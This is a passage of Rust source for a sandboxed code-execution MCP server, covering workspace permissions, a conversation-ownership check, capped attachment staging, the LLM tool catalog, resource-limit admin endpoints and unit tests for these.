    // `download_handler`.
    assert_owns_conversation(conversation_id, user_id).await?;

    let workspace = workspace_for(state, conversation_id);
    tokio::fs::create_dir_all(&workspace).await.map_err(|e| {
        crate::common::AppError::new(
            StatusCode::INTERNAL_SERVER_ERROR,
            "WORKSPACE_INIT_FAILED",
            format!("mkdir workspace: {e}"),
        )
    })?;
    // Audit H-7: bump the `.last_used` sentinel that the workspace reaper
    // reads. Previously this was only written by `sandbox::run_in_sandbox`
    // (the Linux host-bwrap path), so Mac libkrun and Windows WSL2 long-
    // running conversations got reaped mid-execution after 30d because no
    // backend bumped their sentinel. Writing it here covers EVERY backend —
    // build_context runs in every MCP tool dispatch path before the actual
    // backend.run() fires. Failures are best-effort: the reaper's fallback
    // is the directory mtime, and a per-call failure to bump the sentinel
    // is bounded by the next call succeeding.
    let _ = tokio::fs::write(
        workspace.join(".last_used"),
        chrono::Utc::now().timestamp().to_string(),
    )
    .await;
    // Permission-mode for the per-conversation workspace.
    //
    // Audit H-3: previously `0o1777` (sticky world-writable) was applied on
    // ALL platforms. On Mac libkrun + Windows WSL2 the workload runs at
    // uid 1001 inside the VM (via virtio-fs uid-passthrough) and the host
    // uid that owns the workspace dir is the server's — so the dir MUST be
    // world-writable for the in-VM workload to create files. Fine on Mac
    // (single-user box) and WSL2 (per-user utility VM). On Linux host-bwrap,
    // bwrap's `--unshare-user` maps in-sandbox uid 1001 → the server's host
    // uid, so the server already owns the workspace and `0o700` suffices.
    // Keeping `0o1777` on Linux is a cross-tenant data leak on multi-user
    // hosts (every local user can read/write every conversation's workspace).
    #[cfg(target_os = "linux")]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = tokio::fs::set_permissions(
            &workspace,
            std::fs::Permissions::from_mode(0o700),
        )
        .await;
    }
    #[cfg(target_os = "macos")]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = tokio::fs::set_permissions(
            &workspace,
            std::fs::Permissions::from_mode(0o1777),
        )
        .await;
    }
    // Windows host has its own NTFS ACL story; the in-WSL2-distro path that
    // rsync's bytes into the agent's GUEST_WORKSPACE_ROOT applies its own
    // mode. Nothing to chmod on the Windows host side.

    let files = Repos
        .code_sandbox
        .get_conversation_files(conversation_id)
        .await?;
    let _ = code_sandbox_server_id(); // keep symbol live for tests

    // Stage attachments to the host paths that `build_bwrap_argv` will
    // bind into the sandbox at `/home/sandboxuser/<filename>`. Without
    // this, `--ro-bind-try` silently no-ops on every attachment and the
    // shell inside `execute_command` cannot see them — even though the
    // tool description tells the LLM "Conversation attachments are
    // available in the working directory by their original filename."
    //
    // The stage dir lives OUTSIDE the per-conversation workspace bind
    // mount, so sandboxed code cannot mutate the originals via the
    // workspace path — the file is only reachable via the explicit
    // `--ro-bind` at the friendly name.
    //
    // Staging is idempotent: file bytes don't change once uploaded, so
    // we only write on first miss. Per-file failures are logged and
    // skipped — the LLM falls back to the `read_file` tool (which
    // reads via the storage trait directly) if a bind fails.
    stage_attachments(state, &files).await;

    Ok(SandboxContext {
        conversation_id,
        user_id,
        workspace,
        files: Arc::new(files),
    })
}

/// Per-file size cap. Files larger than this are skipped (logged) so
/// a single huge attachment cannot OOM the server during staging.
/// The LLM's `read_file` tool also falls back to the storage layer
/// directly for these — so the attachment is still reachable, just
/// not bind-mounted into the shell.
pub const ATTACHMENT_STAGE_MAX_BYTES_PER_FILE: u64 = 64 * 1024 * 1024;

/// Per-call total cap. Stops staging once we've written this much in
/// a single tools/call. Bounds memory + disk per request.
pub const ATTACHMENT_STAGE_MAX_BYTES_PER_CALL: u64 = 256 * 1024 * 1024;

/// Per-call file count cap. Bounds work + bwrap argv length (each
/// staged file becomes 3 bwrap argv elements — `--ro-bind-try`,
/// `<host>`, `<sandbox>`).
pub const ATTACHMENT_STAGE_MAX_FILES_PER_CALL: usize = 256;

async fn stage_attachments(
    state: &CodeSandboxState,
    files: &[crate::modules::code_sandbox::models::ConversationFile],
) {
    let storage = crate::modules::file::storage::manager::get_file_storage();
    stage_attachments_with(state, files, storage.as_ref()).await
}

/// Same as `stage_attachments` but with the storage backend passed in
/// explicitly. Extracted from the global-getter wrapper so unit tests
/// can drive the cap logic against a temp-dir-backed FilesystemStorage
/// without touching the OnceCell-initialized global.
async fn stage_attachments_with(
    state: &CodeSandboxState,
    files: &[crate::modules::code_sandbox::models::ConversationFile],
    storage: &dyn crate::modules::file::storage::FileStorage,
) {
    if files.is_empty() {
        return;
    }
    let stage_dir = state.workspace_root.join("attachments");
    if let Err(e) = tokio::fs::create_dir_all(&stage_dir).await {
        tracing::warn!(
            error = %e,
            "code_sandbox: failed to create attachments stage dir; \
             shell-side attachment access will be unavailable"
        );
        return;
    }
    let mut total_staged_bytes: u64 = 0;
    let mut staged_count: usize = 0;
    for f in files {
        if staged_count >= ATTACHMENT_STAGE_MAX_FILES_PER_CALL {
            tracing::warn!(
                limit = ATTACHMENT_STAGE_MAX_FILES_PER_CALL,
                conversation_files = files.len(),
                "code_sandbox: per-call file count cap reached; \
                 remaining attachments are NOT bind-mounted into the \
                 shell (read_file tool can still reach them)"
            );
            break;
        }
        let stage_path = stage_dir.join(f.file_id.to_string());
        // Idempotent: file_id is content-addressed in practice and the
        // bytes don't change once uploaded. We bound the staged_count
        // here too because the cap is about bwrap argv length, not
        // about today's IO cost.
        if tokio::fs::try_exists(&stage_path).await.unwrap_or(false) {
            staged_count += 1;
            continue;
        }
        let ext = attachment_extension(&f.filename);
        let bytes = match storage.load_original(f.user_id, f.file_id, ext).await {
            Ok(b) => b,
            Err(e) => {
                tracing::warn!(
                    file_id = %f.file_id,
                    filename = %f.filename,
                    error = ?e,
                    "code_sandbox: stage attachment load failed"
                );
                continue;
            }
        };
        if (bytes.len() as u64) > ATTACHMENT_STAGE_MAX_BYTES_PER_FILE {
            tracing::warn!(
                file_id = %f.file_id,
                filename = %f.filename,
                size = bytes.len(),
                cap = ATTACHMENT_STAGE_MAX_BYTES_PER_FILE,
                "code_sandbox: attachment exceeds per-file stage cap; skipped \
                 (still reachable via read_file tool)"
            );
            continue;
        }
        if total_staged_bytes.saturating_add(bytes.len() as u64)
            > ATTACHMENT_STAGE_MAX_BYTES_PER_CALL
        {
            tracing::warn!(
                already_staged = total_staged_bytes,
                attempted = bytes.len(),
                cap = ATTACHMENT_STAGE_MAX_BYTES_PER_CALL,
                "code_sandbox: per-call total stage cap reached; \
                 remaining attachments are NOT bind-mounted into the shell"
            );
            break;
        }
        // Atomic write: stage to a temp path then rename. Without
        // this, a concurrent call that finds `try_exists == true`
        // could observe partial bytes from a write that was
        // interrupted by HTTP client disconnect (kill_on_drop +
        // future cancellation).
        let tmp_path = stage_dir.join(format!("{}.tmp.{}", f.file_id, std::process::id()));
        if let Err(e) = tokio::fs::write(&tmp_path, &bytes).await {
            tracing::warn!(
                file_id = %f.file_id,
                filename = %f.filename,
                error = %e,
                "code_sandbox: stage attachment tmp write failed"
            );
            let _ = tokio::fs::remove_file(&tmp_path).await;
            continue;
        }
        if let Err(e) = tokio::fs::rename(&tmp_path, &stage_path).await {
            tracing::warn!(
                file_id = %f.file_id,
                filename = %f.filename,
                error = %e,
                "code_sandbox: stage attachment rename failed"
            );
            let _ = tokio::fs::remove_file(&tmp_path).await;
            continue;
        }
        total_staged_bytes = total_staged_bytes.saturating_add(bytes.len() as u64);
        staged_count += 1;
    }
}

/// Extract the extension a `FileStorage::load_original` call expects
/// for the given filename. Returns `"bin"` for files without an
/// extension (storage manager's fallback convention).
fn attachment_extension(filename: &str) -> &str {
    std::path::Path::new(filename)
        .extension()
        .and_then(|s| s.to_str())
        .unwrap_or("bin")
}

fn workspace_for(state: &CodeSandboxState, conversation_id: Uuid) -> std::path::PathBuf {
    state
        .workspace_root
        .join(conversation_id.to_string())
}

/// SECURITY: assert that the JWT-authenticated `user_id` is the owner
/// of `conversation_id`. Returns the same 404 error for "conversation
/// does not exist" and "exists but caller is not owner" to avoid
/// leaking conversation existence across users.
///
/// Call this at every entry point that resolves resources by
/// conversation_id (per-call dispatch in `jsonrpc_handler` and the
/// workspace download in `download_handler`). The repository layer
/// does NOT enforce this — `get_conversation_files` was deliberately
/// loosened to a single-argument query so the ownership policy lives
/// in one place at the handler boundary.
async fn assert_owns_conversation(
    conversation_id: Uuid,
    user_id: Uuid,
) -> Result<(), crate::common::AppError> {
    let owner = Repos
        .code_sandbox
        .get_conversation_user_id(conversation_id)
        .await?;
    if owner != Some(user_id) {
        tracing::warn!(
            requested_conversation_id = %conversation_id,
            caller_user_id = %user_id,
            owner_user_id = ?owner,
            "code_sandbox: rejected cross-tenant conversation access"
        );
        return Err(crate::common::AppError::new(
            StatusCode::NOT_FOUND,
            "CONVERSATION_NOT_FOUND",
            format!("conversation {conversation_id} not found"),
        ));
    }
    Ok(())
}

// --------------------------------------------------------------------
// Tool catalog (single source of truth — snapshot-tested in Phase 9
// Tier 1 against a checked-in fixture).
// --------------------------------------------------------------------

pub(crate) fn tool_definitions() -> Value {
    // Descriptions carry runtime guidance the LLM uses to plan its
    // tool calls (rootfs is read-only → --user installs; line-number
    // format passes through read_file → edit_file; etc.). Kept verbose
    // on purpose; clients surface these directly to the model.
    json!([
        {
            "name": "execute_command",
            "description": "Execute a shell command in the sandbox.\n\
                \n\
                ENVIRONMENTS (pick via `flavor` param; defaults to 'minimal' if omitted):\n\
                - 'minimal' (~57 MB): bash + coreutils + curl + jq + git + python3 (interpreter only).\n\
                  Sufficient for shell pipelines, simple Python scripts, file munging.\n\
                - 'full' (~850 MB): minimal + numpy, pandas, torch, R 4.4 + tidyverse, Node 22, \
                  TypeScript / ts-node. Switch to this when the task needs ML libraries or R.\n\
                \n\
                Uncached environments auto-download on first use (~10-30 s for minimal, \
                ~2-5 min for full); the chat UI surfaces a system note when this happens. \
                Use `list_sandbox_environments` to inspect what's installed in each flavor.\n\
                \n\
                BEFORE INSTALLING A PACKAGE: Always check if it is already installed first.\n\
                - Python: python3 -c \"import <pkg>\" 2>/dev/null && echo installed || echo missing\n\
                - R: Rscript -e \"'<pkg>' %in% rownames(installed.packages())\"\n\
                Only install if the check shows the package is missing.\n\
                \n\
                INSTALLING EXTRA PACKAGES: The rootfs /usr is read-only, so you MUST always use \
                'pip install --user <pkg>' (NOT 'pip install <pkg>'). User-installed packages persist \
                across calls in this conversation.\n\
                \n\
                FILES: Conversation attachments are available in the working directory by their \
                original filenames.\n\
                TIMEOUT: 10 minutes. Output capped at 1 MiB per stream.",
            "inputSchema": {
                "type": "object",
                "required": ["command"],
                "properties": {
                    "command": {
                        "type": "string",
                        "description": "Shell command to execute (runs via /bin/bash -lc)"
                    },
                    "flavor": {
                        "type": "string",
                        "enum": ["minimal", "full"],
                        "default": "minimal",
                        "description": "Sandbox environment. 'minimal' (~57 MB) for shell + Python interpreter. 'full' (~850 MB) for numpy/torch/R/Node. Uncached flavors auto-fetch on first use."
                    }
                }
            }
        },
        {
            "name": "read_file",
            "description": "Read a file by filename. Searches first in the sandbox working directory, \
                then falls back to conversation attachments (loaded transparently from the user's \
                originals store). Use just the filename (e.g., 'data.csv'), not a full path. \
                Output includes 1-indexed line numbers in the format 'N: content' — these line numbers \
                feed directly into edit_file.",
            "inputSchema": {
                "type": "object",
                "required": ["filename"],
                "properties": {
                    "filename": {
                        "type": "string",
                        "description": "Filename to read (plain name only, e.g. 'data.csv')"
                    },
                    "start_line": {
                        "type": "integer",
                        "minimum": 1,
                        "description": "First line to return (1-indexed, optional)"
                    },
                    "end_line": {
                        "type": "integer",
                        "minimum": 1,
                        "description": "Last line to return (inclusive, optional)"
                    }
                }
            }
        },
        {
            "name": "write_file",
            "description": "Write content to a file in the sandbox working directory. Creates or \
                overwrites the file (and any intermediate parent directories). Use a plain filename \
                (e.g., 'script.py'). If the resulting file needs to be shared with the user or passed \
                to another MCP server, call get_resource_link.",
            "inputSchema": {
                "type": "object",
                "required": ["filename", "content"],
                "properties": {
                    "filename": {
                        "type": "string",
                        "description": "Filename to write (plain name, e.g. 'script.py')"
                    },
                    "content": {
                        "type": "string",
                        "description": "File content to write"
                    }
                }
            }
        },
        {
            "name": "edit_file",
            "description": "Edit a file by replacing lines start_line through end_line (1-indexed, \
                inclusive) with new_content. Call read_file first to identify the correct line range — \
                output is in 'N: content' format. \
                new_content may be an empty string to delete lines without replacement. \
                To append after the last line, set start_line = total_line_count + 1 \
                (e.g., for a 10-line file, use start_line=11, end_line=11). \
                Use a plain filename. If the resulting file needs to be shared with the user or passed \
                to another MCP server, call get_resource_link.",
            "inputSchema": {
                "type": "object",
                "required": ["filename", "start_line", "end_line", "new_content"],
                "properties": {
                    "filename": {
                        "type": "string",
                        "description": "Filename to edit (plain name, e.g. 'script.py')"
                    },
                    "start_line": {
                        "type": "integer",
                        "minimum": 1,
                        "description": "First line to replace (1-indexed, inclusive). Use total_line_count+1 to append after last line."
                    },
                    "end_line": {
                        "type": "integer",
                        "minimum": 1,
                        "description": "Last line to replace (1-indexed, inclusive). Ignored when appending."
                    },
                    "new_content": {
                        "type": "string",
                        "description": "Replacement content for the specified line range. May be empty to delete lines, or multi-line."
                    }
                }
            }
        },
        {
            "name": "list_files",
            "description": "List files in the sandbox working directory (root level only, sorted \
                alphabetically). Shows user-written files and any conversation attachments that have \
                been read into the workspace. Hidden files (.dotfiles) and sandbox-internal state \
                (.sandbox_*) are excluded.",
            "inputSchema": { "type": "object", "properties": {} }
        },
        {
            "name": "get_resource_link",
            "description": "Return a standard MCP resource_link for a file, either from the sandbox \
                working directory or from user-attached conversation files.\n\
                \n\
                Use this tool when an external MCP server needs a download URL to access a file:\n\
                - For files you produced in this session (via write_file, edit_file, or \
                execute_command): returns an absolute URL the MCP client will fetch and may save as a \
                permanent artifact (`is_saved: false`).\n\
                - For user-attached files (referenced by their original filename): returns a short-lived \
                JWT-signed download-with-token URL that can be passed directly to external MCP tools \
                (`is_saved: true`).\n\
                \n\
                Use a plain filename (e.g., 'report.pdf' or 'data.csv').",
            "inputSchema": {
                "type": "object",
                "required": ["filename"],
                "properties": {
                    "filename": {
                        "type": "string",
                        "description": "Filename of the file in the sandbox working directory"
                    },
                    "save_as": {
                        "type": "string",
                        "description": "Optional display name for the artifact (defaults to filename)"
                    }
                }
            }
        },
        {
            "name": "list_sandbox_environments",
            "description": "Return the rootfs environments available for `execute_command`'s \
                `flavor` parameter. Each entry includes a human-readable description of what's \
                installed and the approximate download size. Use this to decide which flavor to \
                pass to execute_command — pick the smallest flavor that has the tools the task \
                needs. The `cached` field tells you whether picking that flavor will trigger a \
                download (false → ~10 s to ~5 min latency on the first execute_command).",
            "inputSchema": { "type": "object", "properties": {} }
        }
    ])
}

// =====================================================================
// Resource-limits admin REST surface (Plan 1 §6)
// =====================================================================

use crate::modules::code_sandbox::permissions::{
    CodeSandboxResourceLimitsManage, CodeSandboxResourceLimitsRead,
};
use crate::modules::code_sandbox::resource_limits::{
    CodeSandboxResourceLimits, UpdateCodeSandboxResourceLimits,
};

/// GET /code-sandbox/resource-limits
pub async fn get_resource_limits_handler(
    _auth: RequirePermissions<(CodeSandboxResourceLimitsRead,)>,
) -> crate::common::ApiResult<Json<CodeSandboxResourceLimits>> {
    let row = Repos.code_sandbox.get_resource_limits().await?;
    Ok((StatusCode::OK, Json(row)))
}

pub fn get_resource_limits_docs(
    op: aide::transform::TransformOperation,
) -> aide::transform::TransformOperation {
    with_permission::<(CodeSandboxResourceLimitsRead,)>(op)
        .id("CodeSandbox.getResourceLimits")
        .tag("Code Sandbox")
        .summary("Read the singleton sandbox resource-limits configuration")
        .description(
            "Returns the current memory / CPU / PID / prlimit / timeout caps that \
             the sandbox runtime applies on every `execute_command`. Admin-only.",
        )
        .response::<200, Json<CodeSandboxResourceLimits>>()
        .response_with::<401, (), _>(|r| r.description("Unauthorized"))
}

/// PUT /code-sandbox/resource-limits
pub async fn update_resource_limits_handler(
    _auth: RequirePermissions<(CodeSandboxResourceLimitsManage,)>,
    Json(patch): Json<UpdateCodeSandboxResourceLimits>,
) -> crate::common::ApiResult<Json<CodeSandboxResourceLimits>> {
    patch.validate()?;
    let row = Repos.code_sandbox.update_resource_limits(&patch).await?;
    // Invalidate the cached snapshot the hot path reads from so the new
    // limits take effect on the very next `execute_command`. The cache lives
    // on `CodeSandboxState` (§6.3 wires it up); we look it up via the
    // module-private accessor rather than threading state through every
    // handler signature.
    crate::modules::code_sandbox::resource_limits_cache::invalidate(&row);
    Ok((StatusCode::OK, Json(row)))
}

pub fn update_resource_limits_docs(
    op: aide::transform::TransformOperation,
) -> aide::transform::TransformOperation {
    with_permission::<(CodeSandboxResourceLimitsManage,)>(op)
        .id("CodeSandbox.updateResourceLimits")
        .tag("Code Sandbox")
        .summary("Update the singleton sandbox resource-limits configuration")
        .description(
            "PATCH semantics: any field omitted from the body preserves its \
             existing value. Validation rejects out-of-range values with 422; \
             the new limits take effect on the very next `execute_command`.",
        )
        .response::<200, Json<CodeSandboxResourceLimits>>()
        .response_with::<401, (), _>(|r| r.description("Unauthorized"))
        .response_with::<422, (), _>(|r| r.description("Value out of range"))
}

// =====================================================================
// Tier 1 unit tests — tool catalog snapshot + JWT helper
// =====================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::Value;

    /// Snapshot: the 7 tools' names + their required-arg sets.
    /// Bumping this is a deliberate signal that the public sandbox
    /// surface changed — schema bump territory.
    #[test]
    fn tool_definitions_snapshot() {
        let tools: Value = super::tool_definitions();
        let arr = tools.as_array().expect("tools is an array");
        assert_eq!(arr.len(), 7, "expected exactly 7 tools");

        let mut shape: Vec<(String, Vec<String>)> = arr
            .iter()
            .map(|t| {
                let name = t["name"].as_str().unwrap().to_string();
                let required: Vec<String> = t["inputSchema"]["required"]
                    .as_array()
                    .map(|a| {
                        a.iter()
                            .filter_map(|v| v.as_str().map(String::from))
                            .collect()
                    })
                    .unwrap_or_default();
                (name, required)
            })
            .collect();
        shape.sort();

        let expected: Vec<(String, Vec<String>)> = vec![
            ("edit_file".into(), vec!["filename".into(), "start_line".into(), "end_line".into(), "new_content".into()]),
            ("execute_command".into(), vec!["command".into()]),
            ("get_resource_link".into(), vec!["filename".into()]),
            ("list_files".into(), vec![]),
            ("list_sandbox_environments".into(), vec![]),
            ("read_file".into(), vec!["filename".into()]),
            ("write_file".into(), vec!["filename".into(), "content".into()]),
        ];

        assert_eq!(
            shape, expected,
            "tool catalog changed — bump SANDBOX_ROOTFS_SCHEMA_VERSION + update this snapshot"
        );
    }

    #[test]
    fn tool_definitions_have_valid_input_schemas() {
        let tools = super::tool_definitions();
        for t in tools.as_array().unwrap() {
            let schema = &t["inputSchema"];
            assert_eq!(schema["type"], "object", "{} schema type", t["name"]);
            assert!(
                schema.get("properties").is_some(),
                "{} missing properties",
                t["name"]
            );
        }
    }

    // Conversation-id extraction tests moved to types.rs alongside
    // the ConversationIdHeader axum FromRequestParts implementation
    // they exercise.

    // ─── mcp_content_blocks ─────────────────────────────────────────

    #[test]
    fn content_blocks_passes_through_resource_link() {
        let result = json!({
            "type": "resource_link",
            "uri": "http://example/foo",
            "name": "foo",
        });
        let blocks = super::mcp_content_blocks(&result);
        assert_eq!(blocks.len(), 1);
        assert_eq!(blocks[0]["type"], "resource_link");
        assert_eq!(blocks[0]["uri"], "http://example/foo");
        // Critically: NOT wrapped in a text block.
        assert!(blocks[0].get("text").is_none());
    }

    #[test]
    fn content_blocks_passes_through_image_audio_resource() {
        for t in &["image", "audio", "resource"] {
            let result = json!({ "type": t, "data": "..." });
            let blocks = super::mcp_content_blocks(&result);
            assert_eq!(blocks[0]["type"], *t, "{t} block must pass through");
        }
    }

    #[test]
    fn content_blocks_wraps_structured_results_in_text() {
        let result = json!({
            "stdout": "hello",
            "exit_code": 0,
        });
        let blocks = super::mcp_content_blocks(&result);
        assert_eq!(blocks.len(), 1);
        assert_eq!(blocks[0]["type"], "text");
        let text = blocks[0]["text"].as_str().unwrap();
        // The serialized JSON should round-trip.
        let parsed: serde_json::Value = serde_json::from_str(text).unwrap();
        assert_eq!(parsed, result);
    }

    #[test]
    fn content_blocks_wraps_unknown_type_in_text() {
        // A tool result with an unrelated `type` field (e.g. user data
        // with a "type" key) should NOT be passed through as a content
        // block — it must be wrapped in a text block so the LLM sees
        // the structured data.
        let result = json!({ "type": "user-defined", "color": "blue" });
        let blocks = super::mcp_content_blocks(&result);
        assert_eq!(blocks[0]["type"], "text");
    }

    // ─── Content-Disposition filename sanitization ──────────────────

    #[test]
    fn disposition_filename_strips_quotes_and_backslashes() {
        let raw = r#"foo"bar\baz.txt"#;
        let out = super::disposition_filename(raw);
        assert_eq!(out, "foo_bar_baz.txt");
    }

    #[test]
    fn disposition_filename_strips_non_ascii() {
        let raw = "café.txt";
        let out = super::disposition_filename(raw);
        assert!(out.is_ascii());
        assert!(out.ends_with(".txt"));
    }

    #[test]
    fn disposition_filename_strips_crlf() {
        let raw = "foo\r\nbar.txt";
        let out = super::disposition_filename(raw);
        assert!(!out.contains('\r'));
        assert!(!out.contains('\n'));
    }

    #[test]
    fn disposition_filename_takes_basename() {
        let raw = "sub/dir/foo.txt";
        let out = super::disposition_filename(raw);
        assert_eq!(out, "foo.txt");
    }

    // ─── attachment_extension ───────────────────────────────────────

    #[test]
    fn attachment_extension_extracts_simple() {
        assert_eq!(super::attachment_extension("data.csv"), "csv");
        assert_eq!(super::attachment_extension("foo.tar.gz"), "gz");
        assert_eq!(super::attachment_extension("IMG.PNG"), "PNG");
    }

    #[test]
    fn attachment_extension_falls_back_to_bin_for_no_extension() {
        // Must NOT return the whole filename (the naive
        // `rsplit('.').next().unwrap_or("bin")` pattern gets this wrong
        // — it returns "Makefile" for "Makefile" instead of "bin").
        assert_eq!(super::attachment_extension("Makefile"), "bin");
        assert_eq!(super::attachment_extension("README"), "bin");
        assert_eq!(super::attachment_extension(""), "bin");
    }

    #[test]
    fn attachment_extension_handles_dotfiles() {
        // ".bashrc" has no real extension — Path::extension returns
        // None for files whose name starts with a single dot.
        assert_eq!(super::attachment_extension(".bashrc"), "bin");
        // ".config.json" has extension "json".
        assert_eq!(super::attachment_extension(".config.json"), "json");
    }

    // ─── stage_attachments caps (DoS regressions) ───────────────────
    //
    // Each test builds a temp-dir FilesystemStorage, populates it with
    // synthetic file blobs, then invokes stage_attachments_with(...)
    // and inspects the resulting stage dir.

    use crate::core::config::CodeSandboxConfig;
    use crate::modules::code_sandbox::models::ConversationFile;
    use crate::modules::code_sandbox::types::{
        CgroupMode, CodeSandboxState, HostCapabilities, SeccompMode,
    };
    use crate::modules::file::storage::filesystem::FilesystemStorage;
    use std::path::PathBuf;

    fn fake_state(workspace_root: PathBuf) -> CodeSandboxState {
        CodeSandboxState {
            config: CodeSandboxConfig {
                enabled: true,
                rootfs_path: Some(String::new()),
                cgroup_parent: String::new(),
                ..Default::default()
            },
            loopback_url: "http://127.0.0.1:8080/api/code-sandbox".to_string(),
            workspace_root,
            host_caps: HostCapabilities {
                bwrap_path: PathBuf::from("/usr/bin/bwrap"),
                cgroup: CgroupMode::None,
                seccomp: SeccompMode::NotLinked,
            },
            // These handler unit tests stub the DB layer via
            // repository mocks, so the optional version-manager
            // pool stays None.
            pool: None,
        }
    }

    /// Write a synthetic blob into the storage's `originals/<user>/<file>.<ext>`
    /// path so `load_original(user, file, ext)` returns those bytes.
    async fn seed_attachment(
        storage: &FilesystemStorage,
        user_id: Uuid,
        file_id: Uuid,
        extension: &str,
        bytes: &[u8],
    ) {
        use crate::modules::file::storage::FileStorage;
        storage
            .save_original(user_id, file_id, extension, bytes)
            .await
            .expect("seed");
    }

    fn conv_file(file_id: Uuid, user_id: Uuid, filename: &str) -> ConversationFile {
        ConversationFile {
            file_id,
            filename: filename.to_string(),
            user_id,
            mime_type: None,
            created_at: chrono::Utc::now(),
        }
    }

    #[tokio::test]
    async fn stage_attachments_writes_each_file_to_attachments_dir() {
        let workspace_tmp = tempfile::tempdir().unwrap();
        let storage_tmp = tempfile::tempdir().unwrap();
        let storage = FilesystemStorage::new(storage_tmp.path());

        let user = Uuid::new_v4();
        let f1 = Uuid::new_v4();
        let f2 = Uuid::new_v4();
        seed_attachment(&storage, user, f1, "txt", b"hello").await;
        seed_attachment(&storage, user, f2, "csv", b"a,b,c\n1,2,3\n").await;

        let state = fake_state(workspace_tmp.path().to_path_buf());
        let files = vec![
            conv_file(f1, user, "greeting.txt"),
            conv_file(f2, user, "data.csv"),
        ];
        super::stage_attachments_with(&state, &files, &storage).await;

        let dir = state.workspace_root.join("attachments");
        assert_eq!(
            tokio::fs::read(dir.join(f1.to_string())).await.unwrap(),
            b"hello"
        );
        assert_eq!(
            tokio::fs::read(dir.join(f2.to_string())).await.unwrap(),
            b"a,b,c\n1,2,3\n"
        );
    }

    #[tokio::test]
    async fn stage_attachments_skips_files_over_per_file_cap() {
        let workspace_tmp = tempfile::tempdir().unwrap();
        let storage_tmp = tempfile::tempdir().unwrap();
        let storage = FilesystemStorage::new(storage_tmp.path());

        let user = Uuid::new_v4();
        let small_id = Uuid::new_v4();
        let big_id = Uuid::new_v4();
        // small: 1KB, well under cap. big: per-file cap + 1 byte.
        let small = vec![b'a'; 1024];
        let big = vec![b'X'; super::ATTACHMENT_STAGE_MAX_BYTES_PER_FILE as usize + 1];
        seed_attachment(&storage, user, small_id, "txt", &small).await;
        seed_attachment(&storage, user, big_id, "bin", &big).await;

        let state = fake_state(workspace_tmp.path().to_path_buf());
        let files = vec![
            conv_file(small_id, user, "small.txt"),
            conv_file(big_id, user, "big.bin"),
        ];
        super::stage_attachments_with(&state, &files, &storage).await;

        let dir = state.workspace_root.join("attachments");
        assert!(
            dir.join(small_id.to_string()).exists(),
            "small file MUST be staged"
        );
        assert!(
            !dir.join(big_id.to_string()).exists(),
            "oversized file MUST NOT be staged"
        );
    }

    #[tokio::test]
    async fn stage_attachments_respects_per_call_total_cap() {
        let workspace_tmp = tempfile::tempdir().unwrap();
        let storage_tmp = tempfile::tempdir().unwrap();
        let storage = FilesystemStorage::new(storage_tmp.path());

        // Stage 5 files, each just under per-file cap but together
        // exceeding the per-call total cap. We expect to stop early.
        let per_file: usize = super::ATTACHMENT_STAGE_MAX_BYTES_PER_FILE as usize;
        let total_cap: usize = super::ATTACHMENT_STAGE_MAX_BYTES_PER_CALL as usize;
        // n_files * per_file > total_cap → 5 * 64MiB = 320MiB > 256MiB
        let n_files = (total_cap / per_file) + 2;

        let user = Uuid::new_v4();
        let blob = vec![b'q'; per_file];
        let mut files = Vec::new();
        for _ in 0..n_files {
            let id = Uuid::new_v4();
            seed_attachment(&storage, user, id, "bin", &blob).await;
            files.push(conv_file(id, user, "x.bin"));
        }

        let state = fake_state(workspace_tmp.path().to_path_buf());
        super::stage_attachments_with(&state, &files, &storage).await;

        // Count how many of the staged files made it onto disk.
        let dir = state.workspace_root.join("attachments");
        let staged_count = std::fs::read_dir(&dir)
            .map(|it| it.filter(|e| {
                e.as_ref()
                    .ok()
                    .and_then(|e| e.file_name().to_str().map(|n| !n.contains(".tmp.")))
                    .unwrap_or(false)
            }).count())
            .unwrap_or(0);
        // total_cap / per_file files should fit; the next attempt
        // hits the cap and breaks the loop.
        let expected_max = total_cap / per_file;
        assert!(
            staged_count <= expected_max,
            "staged {staged_count} > expected_max {expected_max} (per-call cap not enforced)"
        );
    }

    #[tokio::test]
    async fn stage_attachments_respects_per_call_count_cap() {
        let workspace_tmp = tempfile::tempdir().unwrap();
        let storage_tmp = tempfile::tempdir().unwrap();
        let storage = FilesystemStorage::new(storage_tmp.path());

        // Stage MAX+10 tiny files; expect only MAX bind-mounted.
        let n = super::ATTACHMENT_STAGE_MAX_FILES_PER_CALL + 10;
        let user = Uuid::new_v4();
        let mut files = Vec::with_capacity(n);
        for _ in 0..n {
            let id = Uuid::new_v4();
            seed_attachment(&storage, user, id, "txt", b"x").await;
            files.push(conv_file(id, user, "x.txt"));
        }

        let state = fake_state(workspace_tmp.path().to_path_buf());
        super::stage_attachments_with(&state, &files, &storage).await;

        let dir = state.workspace_root.join("attachments");
        let staged_count = std::fs::read_dir(&dir)
            .map(|it| it.filter(|e| {
                e.as_ref()
                    .ok()
                    .and_then(|e| e.file_name().to_str().map(|n| !n.contains(".tmp.")))
                    .unwrap_or(false)
            }).count())
            .unwrap_or(0);
        assert_eq!(
            staged_count,
            super::ATTACHMENT_STAGE_MAX_FILES_PER_CALL,
            "expected exactly MAX_FILES_PER_CALL files staged"
        );
    }

    #[tokio::test]
    async fn stage_attachments_is_idempotent() {
        let workspace_tmp = tempfile::tempdir().unwrap();
        let storage_tmp = tempfile::tempdir().unwrap();
        let storage = FilesystemStorage::new(storage_tmp.path());

        let user = Uuid::new_v4();
        let id = Uuid::new_v4();
        seed_attachment(&storage, user, id, "txt", b"original").await;

        let state = fake_state(workspace_tmp.path().to_path_buf());
        let files = vec![conv_file(id, user, "a.txt")];

        super::stage_attachments_with(&state, &files, &storage).await;
        let staged_path = state.workspace_root.join("attachments").join(id.to_string());
        let mtime1 = std::fs::metadata(&staged_path).unwrap().modified().unwrap();

        // Tamper with the upstream storage to confirm the second call
        // does NOT re-stage (the staged-file mtime would change if it
        // re-fetched and re-wrote).
        std::thread::sleep(std::time::Duration::from_millis(50));
        super::stage_attachments_with(&state, &files, &storage).await;
        let mtime2 = std::fs::metadata(&staged_path).unwrap().modified().unwrap();
        assert_eq!(mtime1, mtime2, "second call must not re-write a staged file");
    }

    #[tokio::test]
    async fn stage_attachments_atomic_overwrites_tmp_file_from_prior_crash() {
        // Pre-plant a leftover .tmp.<pid> file (simulating a previous
        // call that died between write and rename). The current call
        // should still succeed: it writes a fresh tmp + renames over
        // the final path. The leftover stays behind (cleaned up by
        // a separate sweep — not in scope here) but doesn't break
        // the new staging.
        let workspace_tmp = tempfile::tempdir().unwrap();
